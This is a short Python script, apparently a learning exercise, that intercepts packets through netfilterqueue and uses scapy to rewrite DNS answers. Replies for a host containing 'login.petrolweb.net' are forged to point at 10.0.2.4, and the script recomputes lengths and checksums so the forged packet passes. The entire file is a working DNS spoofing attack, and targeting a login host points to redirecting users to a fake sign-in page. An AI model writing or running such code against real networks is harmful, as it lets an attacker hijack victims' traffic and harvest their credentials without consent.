#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # We maps it to scapy because the dafaule packet are string
    # There are very hard to change it
    # Then we modified, we should restore it type to str.
    if (scapy_packet.haslayer(scapy.DNSRR)):
        qname = scapy_packet[scapy.DNSQR].qname
        if "login.petrolweb.net" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname,rdata ="10.0.2.4")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))


    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()